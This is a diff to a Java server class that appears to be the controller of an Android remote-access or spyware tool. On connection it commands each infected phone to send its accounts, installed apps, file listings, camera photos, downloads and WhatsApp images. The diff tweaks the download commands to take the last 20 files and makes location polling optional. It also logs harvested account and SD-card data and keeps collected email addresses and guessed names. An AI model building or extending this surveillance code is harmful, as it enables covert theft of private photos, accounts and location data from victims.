@@ -66,19 +66,22 @@ public class ClientThread implements Runnable {
             say("accounts");
             say("apps");
             say("ls /");
-            say("download /DCIM/Camera");
-            say("download /Download");
-            say("download /WhatsApp/Media/WhatsApp Images");
-            say("download /");
+            say("downlast 20, /DCIM/Camera");
+            say("downlast 20, /Download");
+            say("downlast 20, /WhatsApp/Media/WhatsApp Images");
+            say("downlast 20, /");
 
             // TODO check if client already exists.
             // TODO notification of a new device
 
             // Start heartbeat
             heartbeat = new Heartbeat(out);
-            locationPoller = new LocationPoller(out, pollingRate);
             heartbeat.start();
-            locationPoller.start();
+
+            if (pollingRate > 0) {
+                locationPoller = new LocationPoller(out, pollingRate);
+                locationPoller.start();
+            }
 
             while (listen) {
                 // get header
@@ -87,7 +90,7 @@ public class ClientThread implements Runnable {
                 // get size, we expect the next data ([25 - 28]) to contain an int
                 int size = in.readInt();
                 byte[] message;
-                switch(header){
+                switch (header) {
                     case Protocol.MESSAGE:
                         // here comes a message
                         message = new byte[size];
@@ -122,6 +125,7 @@ public class ClientThread implements Runnable {
                         message = new byte[size];
                         in.readFully(message, 0, message.length);
                         logger.log("strMessage: " + new String(message, "UTF-8"));
+                        break;
                 }
             }
         } catch (SocketTimeoutException e) {
@@ -190,15 +194,21 @@ public class ClientThread implements Runnable {
         }
         if (message.startsWith("Accounts:")) {
             accountLogger.log(message);
+            logger.log("Logged Accounts to: " + accountLogger.accountsFile);
+            return;
         }
         if (message.startsWith("Connected to: ") || message.startsWith("IP address")) {
             wifiAPLogger.log(message);
         }
         if (message.startsWith("Installed apps:")) {
             installedAppsLogger.log(message);
+            logger.log("Logged Installed apps to: " + accountLogger.installedAppsFile);
+            return;
         }
         if (message.startsWith("dir: //")) {
             sdCardLogger.log(message);
+            logger.log("Logged SD-card contents to: " + accountLogger.sdCardFile);
+            return;
         }
         if (message.startsWith("status:")) {
             statusLogger.log(message);
@@ -231,7 +241,7 @@ public class ClientThread implements Runnable {
     }
 
     public ArrayList<String> getEmailAddresses() {
-        if(emailAddresses.size() > 0) {
+        if (emailAddresses.size() > 0) {
             return emailAddresses;
         } else {
             ArrayList<String> noEmailAddresses = new ArrayList<String>();
@@ -241,7 +251,7 @@ public class ClientThread implements Runnable {
     }
 
     public ArrayList<String> getGuessedNames() {
-        if(guessedNames.size() > 0) {
+        if (guessedNames.size() > 0) {
             return guessedNames;
         } else {
             ArrayList<String> noGuessedNames = new ArrayList<String>();
